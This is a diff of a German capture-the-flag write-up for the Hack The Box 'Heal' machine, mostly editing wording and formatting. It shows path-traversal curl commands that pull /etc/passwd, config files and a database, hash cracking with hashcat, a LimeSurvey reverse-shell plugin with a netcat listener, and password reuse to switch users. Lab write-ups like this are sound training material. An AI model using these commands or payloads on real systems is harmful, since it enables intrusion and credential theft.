@@ -63,7 +63,7 @@ Content-Length: 178
 Connection: keep-alive
 Location: http://heal.htb/
 ```
-Damit ich die Seite sehen konnte, musste ich den Hostnamen lokal auflösen. Dazu habe ich die Datei /etc/hosts bearbeitet und heal.htb auf die ip addresse der Maschine verwiesen.
+Damit ich die Seite sehen konnte, musste ich den Hostnamen lokal auflösen. Dazu habe ich die Datei `/etc/hosts` bearbeitet und heal.htb auf die ip addresse der Maschine verwiesen.
 
 ```bash
 sudo nano /etc/hosts
@@ -82,19 +82,19 @@ Diese Konfiguration ermöglichte es uns, die Weboberfläche über den korrekten 
 ## Initial Web Recon – heal.htb
 
 Dank der konfiguration kann ich jetzt die seite auf firefox sehen.
-Wie man sehen kann, wird eine login page angezeigt, was darauf hindeutet, dass ein Backend existiert.
+Wie man sehen kann, wird eine login page angezeigt, was darauf hindeutet, dass möglicherweise ein Backend existiert.
 
 ![1744660028161](image/Dokumentation/1744660028161.png)
 
-Darum habe ich die Login-Seite getestet, und wie erwartet wurde ein Fehler angezeigt. Daher habe ich die console überprüft, um zu sehen, ob es irgendwo hindeuted.
+Darum habe ich die Login Page getestet, und wie erwartet wurde ein Fehler angezeigt. Daher habe ich die console überprüft, um zu sehen, ob es irgendwo hindeuted.
 
 ![1744660324409](image/Dokumentation/1744660324409.png)
 
-Der error `Cross-Origin Request Blocked: The Same Origin Policy disallows reading the remote resource at http://api.heal.htb/signin.` zeigt an das die seite versucht eine request zu machen an ein API backend, api.heal.htb
+Der error `Cross-Origin Request Blocked: The Same Origin Policy disallows reading the remote resource at http://api.heal.htb/signin.` zeigt an das die seite versucht eine request zu machen an ein API backend, `api.heal.htb`
 
 ## Subdomain Enumeration – api.heal.htb
 
-Damit ich die API sehen kann, habe ich, wie bereits bei heal.htb, den Eintrag in der Datei /etc/hosts hinzugefügt.
+Damit ich die API sehen kann, habe ich, wie bereits bei heal.htb, den Eintrag in der Datei `/etc/hosts` hinzugefügt.
 
 ```bash
 sudo nano /etc/hosts
@@ -150,11 +150,11 @@ survey page:
 
 ## Survey inspection
 
-Auf der survey page habe ich den button gehovert und es zeigte eine php page und eine neue sub domain (`take-survey.heal.htb`) an (im unterricht haben wir das mit php angeschaut und dachte mir das ich xss oder so probieren könnte). 
+Auf der survey page habe ich den button gehovert und es zeigte eine php page und eine neue sub domain (`take-survey.heal.htb`) an (im unterricht haben wir das mit php angeschaut und dachte mir das ich xss oder so probieren könnte, ging aber nicht.). 
 
 ![alt text](indexphpsh.png)
 
-wie immer, damit ich die seite ansehen kann habe ich den Eintrag in der Datei /etc/hosts hinzugefügt.
+wie immer, damit ich die seite ansehen kann habe ich den Eintrag in der Datei `/etc/hosts` hinzugefügt.
 
 ```bash
 sudo nano /etc/hosts
@@ -173,15 +173,15 @@ so, jetzt kann ich die survey page sehen:
 
 ![alt text](Screenshot_2025-04-18_21_05_21.png)
 
-ich habe das survey gesendet, bin zurück und dann auf die expired seite gekommen, was mir sagrt das es ein admin gibt, `ralph@heal.htb`. 
+ich habe das survey gesendet, bin zurück und dann auf die expired seite gekommen, was mir dann anzeigt das es ein admin gibt, `ralph@heal.htb`. 
 
 ![alt text](Screenshot_2025-04-19_15_13_54.png)
 
-Das sagt mir das es auch einen Admin login oder so geben sollte. Deswegen habe ich mich entschieden einfach mal /admin zu machen um zu sehen ob es etwas gibt: 
+Das sagt mir das es auch einen Admin login oder so geben sollte. Deswegen habe ich mich entschieden einfach mal `/admin` bei der url einzugeben um zu sehen ob es etwas gibt: 
 
 ![alt text](image-1.png)
 
-wie man sehen kann hat es ein admin panel, aber da ich die login daten nicht weis muss ich einen weg finden um sie herauszufinden.
+wie man sehen kann hat es tatsächlich ein admin panel, aber da ich die login daten bzw. das Passwort nicht weis muss ich einen weg finden um es herauszufinden.
 
 ## Ralphs password
 
@@ -189,11 +189,12 @@ wie man sehen kann hat es ein admin panel, aber da ich die login daten nicht wei
 Nachdem auf der Survey expired‑Seite die Adresse ralph@heal.htb aufgetaucht war, brauchten wir nur noch dessen Kennwort, um uns in das Admin‑Backend einzuloggen.
 
 
-
-1. JWT‑Token abgreifen
-Beim Registrieren‑/Anmelden auf heal.htb wurde im Network‑Tab das JSON‑Feld token zurückgeliefert.
+#### 1. JWT‑Token abgreifen
+Beim Registrieren/Anmelden auf heal.htb wurde im network tab das jwt zurückgeliefert (unten rechts im bild).
 
 ![image with  in dev tools token: ey](image-3.png)
+
+also habe ich den token in eine variable gepackt um mein leben einfacher zu machen einfacher zu machen: 
 
 ```bash
 export TOKEN='eyJhbGciOiJIUzI1NiJ9.eyJ1c2VyX2lkIjo3fQ.bN47YVxPM1ZVqbw4J7oHZeDc3ixY3KO6yZpM5M3nfZE'
@@ -224,8 +225,8 @@ x-runtime: 0.003895
 {"id":7,"email":"lyfe@gmail.com","fullname":"lyfe","username":"lyfe","is_admin":false}  
 ```
 
-2. Path‑Traversal verifizieren
-Um die benötigte Anzahl ../ zu bestimmen, habe ich ein Mini‑Loop gebaut:
+#### 2. Path‑Traversal verifizieren
+Um die benötigte Anzahl `../` zu bestimmen, habe ich einen Mini‑Loop gebaut:
 
 ```bash
 for d in {3..9}; do
@@ -236,7 +237,7 @@ for d in {3..9}; do
 done
 ```
 
-Ergebnis - bei fünf Punkten erschien /etc/passwd, Tiefe 2 zeigte eine vorhandene config.ru:
+Ergebnis - bei fünf Punkten erschien `/etc/passwd`, Tiefe 2 zeigte eine vorhandene config.ru:
 
 ```
 [3] {"errors":"File not found"}[4] {"errors":"File not found"}[5] root:x:0:0:root:/root:/bin/bash
@@ -247,7 +248,7 @@ Ergebnis - bei fünf Punkten erschien /etc/passwd, Tiefe 2 zeigte eine vorhan
 ```
 
 
-3. Rails‑Konfiguration exfiltrieren
+#### 3. Rails‑Konfiguration exfiltrieren
 
 ```bash
 curl -s -H "Authorization: Bearer $TOKEN" \
@@ -255,7 +256,7 @@ curl -s -H "Authorization: Bearer $TOKEN" \
      -o database.yml
 ```
 
-output (unser ziel ist production):
+output (unser ziel ist production, das unterste):
 
 ```yaml
 # SQLite. Versions 3.8.0 and up are supported.
@@ -284,13 +285,15 @@ production:
   <<: *default
   database: storage/development.sqlite3
 ```
-4. SQLite‑DB herunterladen
+#### 4. SQLite‑DB herunterladen
+
+Wie man oben sehen kann ist die production datenbank unter `storage/development.sqlite3`, also habe ich sie heruntergeladen.
 
 ```bash
 curl -s -H "Authorization: Bearer $TOKEN" \
      "http://api.heal.htb/download?filename=../../storage/development.sqlite3" \
      -o dev.sqlite3
-file dev.sqlite3          # → SQLite 3.x database
+file dev.sqlite3          # SQLite 3.x database
 ```
 output: 
 
@@ -299,7 +302,7 @@ dev.sqlite3: SQLite 3.x database, last written using SQLite version 3045002, wri
 
 ```
 
-5. Hashes dumpen
+#### 5. Hashes dumpen
 
 ```bash
 sqlite3 dev.sqlite3 \
@@ -318,7 +321,9 @@ lyfe@gmail.com|$2a$12$j6pguy5SKwp6DppLiMtz1OQJS9ALkxTGInJkB9f/o6zcms5.D5Zre
 ```
 
 
-6. Nur Ralphs Hash isolieren & cracken
+#### 6. Nur Ralphs Hash isolieren & cracken
+
+unser ziel ist nur ralphs pwd, also habe ich ihn isoliert und das pwd mit hashcat gecrackt:  
 
 ```bash
 grep '^ralph@' hashes.txt | cut -d'|' -f2 > ralph.hash
@@ -332,13 +337,13 @@ sudo gzip -d /usr/share/wordlists/rockyou.txt.gz
 hashcat -m 3200 ralph.hash /usr/share/wordlists/rockyou.txt --show
 ```
 
-Hashcat‑Output:
+Hashcat Output:
 
 `$2a$12$dUZ/O7KJT3.zE4TOK8p4RuxH3t.Bz45DSr7A94VLvY9SWx1GCSZnG:147258369`
 
 nice, jetzt haben wir ralphs pwd: `147258369`
 
-7. Erfolgreicher Admin‑Login
+#### 7. Erfolgreicher Admin‑Login
 
 Mit
 
@@ -347,25 +352,26 @@ Benutzer : ralph@heal.htb
 Passwort : 147258369
 ```
 
-konnte ich mich unter http://take‑survey.heal.htb/admin einloggen und erhielt vollen Zugriff auf das LimeSurvey‑Backend (Version 6.6.4).
+konnte ich mich unter http://take‑survey.heal.htb/admin einloggen und erhielt vollen Zugriff auf das LimeSurvey Backend (Version 6.6.4, -> wichtig.).
 
 ![alt text](Screenshot_2025-04-19_17_49_00.png)
 
 ## Reverse Shell – www-data via LimeSurvey Plugin Upload
 
-Nachdem ich Zugriff auf das Admin‑Panel von LimeSurvey hatte, habe nach der version 6.6.4 gesucht und habe im internet gefunden das es ein rce exploit gibt:
+Nachdem ich Zugriff auf das Admin panel von LimeSurvey hatte, habe ich nach der version 6.6.4 im internet gesucht um zu sehen ob es ein exploit gibt. Tatsächlich gab es ein RCE (remote code execution) exploit: 
 
 https://github.com/N4s1rl1/Limesurvey-6.6.4-RCE
 
-Da Standard‑Payloads die Web‑UI oft zum Absturz bringen (504 Gateway Timeout), habe ich ein nicht-blockierendes Reverse‑Shell‑Plugin erstellt, das sich problemlos installieren und triggern lässt.
+Da Standart Payloads die web ui oft zum Absturz bringen (504 Gateway Timeout), habe ich ein nicht-blockierendes Reverse‑Shell‑Plugin mit hilfe des githubs erstellt, das sich problemlos installieren und triggern lässt.
 
-1. Exploit‑Plugin bauen, mit hilfe des github: https://github.com/N4s1rl1/Limesurvey-6.6.4-RCE
+#### 1. Exploit‑Plugin bauen, mit hilfe des github: https://github.com/N4s1rl1/Limesurvey-6.6.4-RCE
 
 ```bash
 mkdir -p ~/heal_plugin && cd ~/heal_plugin
 ```
 
-Reverse‑Shell als PHP‑Datei:
+Reverse shell als php datei:
+
 ```php
 cat > php-rev.php <<'EOF'
 <?php
@@ -379,7 +385,7 @@ system($payload);
 EOF
 ```
 
-Plugin‑Metadaten (config.xml): 
+PLugin Metadaten (config.xml): 
 
 ```xml
 cat > config.xml <<'EOF'
@@ -407,19 +413,19 @@ cat > config.xml <<'EOF'
 EOF
 ```
 
-Zip-Archiv erstellen:
+Zip archive erstellen damit ich es hochladen kann: 
 
 ```bash
 zip lyfe691-exploit.zip php-rev.php config.xml
 ```
 
-2. Plugin hochladen und aktivieren
+#### 2. Plugin hochladen und aktivieren
 
 Im Web-Interface unter http://take‑survey.heal.htb/admin:
 
     Configuration -> Plugins
 
-    Klick auf Upload & install -> lyfe691-exploit.zip auswählen
+    Auf auf Upload & install gecklickt -> lyfe691-exploit.zip ausgewählt
 
     Installieren: 
 
@@ -430,12 +436,11 @@ Im Web-Interface unter http://take‑survey.heal.htb/admin:
 ![alt text](Screenshot_2025-04-19_20_23_11.png)
 
 
-
-3. Listener auf Kali öffnen
+#### 3. Listener im terminal öffnen
 
 `nc -lvnp 9001`
 
-4. Reverse Shell triggern
+#### 4. Reverse Shell triggern
 
 Im Browser:
 
@@ -449,31 +454,31 @@ www-data@heal:/var/www/limesurvey$
 ```
 ![alt text](Screenshot_2025-04-19_20_30_08.png)
 
-Jetzt hatte ich eine voll funktionsfähige Shell als www-data auf der Maschine.
+Jetzt hatte ich eine voll funktionsfähige shell als www-data auf der Maschine.
 
 ## User Flag
 
 Nach dem Exploit über limesurvey hatte ich Zugriff als www-data.
 Ziel war es nun, auf einen lokalen Benutzer mit echten Rechten zu wechseln. inkl userflag holen.
 
-1. Web-Passwort war nicht systemweit gültig
+#### 1. Web-Passwort war nicht systemweit gültig
 
-Zuerst versuchte ich das bereits gecrackte Web‑Passwort von ralph@heal.htb (147258369) für lokale Benutzer:
+Zuerst versuchte ich das bereits gecrackte Web Passwort von ralph@heal.htb (147258369) für lokale Benutzer:
 
-su ralph     # → funktioniert nicht
-su ron       # → ebenfalls fehlgeschlagen
+su ralph     # funktioniert nicht
+su ron       # auch fehlgeschlagen
 
 Beide Logins gaben Authentication failure zurück.
 
-Das bestätigte, dass die gehashten Passwörter aus der Rails‑Datenbank nur für die Web‑App galten – nicht für Linux-Accounts.
+Das bestätigte, dass die gehashten Passwörter aus der Rails Datenbank nur für die Web App galten - nicht für Linux accs.
 
-2. Datenbank‑Passwort holen
+#### 2. Datenbank‑Passwort holen
 
 Im Verzeichnis:
 
 `/var/www/limesurvey/application/config/`
 
-fand ich in der Datei config.php die Zugangsdaten für die PostgreSQL-Datenbank – inklusive Plaintext-Passwort:
+fand ich in der Datei config.php die Zugangsdaten für die PostgreSQL Datenbank. inklusive Passort:
 
 'username' => 'db_user',
 'password' => 'AdmiDi0_pA$$w0rd',
@@ -561,8 +566,8 @@ return array(
 /* Location: ./application/config/config.php */
 ```
 
-Da viele Systeme schwache Passwort‑Policies und Reuse verwenden, habe ich versucht, mich mit diesem Passwort als Benutzer ron einzuloggen.
-3. su auf ron
+Da viele Systeme schwache Passwort policies und reuse verwenden, habe ich versucht, mich mit diesem Passwort als Benutzer ron einzuloggen.
+#### 3. su auf ron
 ```
 www-data@heal:~/limesurvey/upload/plugins/lyfe691-exploit$ su ron
 su ron                                                                                                                                                                                                                                      
@@ -572,7 +577,7 @@ shell-init: error retrieving current directory: getcwd: cannot access parent dir
 
 War erfolgreich. 
 
-4. User-Flag 
+#### 4. User-Flag 
 
 Nach dem Wechsel in rons home dings:
 
